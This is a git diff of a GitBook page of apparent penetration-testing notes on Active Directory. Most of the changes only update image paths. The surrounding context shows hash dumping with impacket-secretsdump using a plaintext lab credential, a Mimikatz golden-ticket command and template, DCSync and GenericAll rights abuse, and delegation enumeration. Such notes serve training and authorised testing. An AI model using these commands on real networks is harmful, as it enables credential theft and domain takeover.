@@ -619,7 +619,7 @@ runas /user:corp\jen powershell.exe
 * Can add new access rights like GenericAll, GenericWrite, or even DCSync
 *
 
-    <figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 * Adding GenericAll rights:
   *   ```powershell
       # Might need to migrate to sqlsvc process using metasploit
@@ -639,7 +639,7 @@ runas /user:corp\jen powershell.exe
 
 
 
-OR.. ![](../.gitbook/assets/image.png)
+OR.. ![](<../.gitbook/assets/image (1).png>)
 
 ```powershell
 #Current user is svc-alfresco
@@ -833,7 +833,7 @@ nslookup appsrv01
           <figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
-      * Dump the NTLM hashes for Files01 computer account (FILES01$)![](<../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+      * Dump the NTLM hashes for Files01 computer account (FILES01$)![](<../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
         *   ```powershell
             impacket-secretsdump CORP/adam:4Toolsfigure3@192.168.101.104
             ```
@@ -917,7 +917,7 @@ nslookup appsrv01
     </strong><strong>Get-DomainUser -TrustedToAuth
     </strong></code></pre>
 
-    <figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 * Contained delegation is configured on IISSvc and it is only allowed to MSSQLSvc
@@ -1245,6 +1245,10 @@ klist
 
 <figure><img src="../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
 
+User's NTLM hash might be displayed:
+
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
 </details>
 
 <details>
@@ -1277,7 +1281,7 @@ Kerberos::golden /user:Administrator /domain:internal.zsm.local /sid:S-1-5-21-30
 # kerberos::golden /user:<USERNAME> /domain:<DOMAIN_NAME> /sid:<ORIGINAL_DOMAIN_SID> /sids:<PARENT_DOMAIN_SID>-519 /rc4:<KRB_TGT_RC4_KEY> /service:<KERBEROS_SERVICE_SP> /target:<TARGET_REALM> /ticket:<OUTPUT_TICKET_FILENAME>
 ```
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 dir \\ZPH-SVRDC01.zsm.local\c$
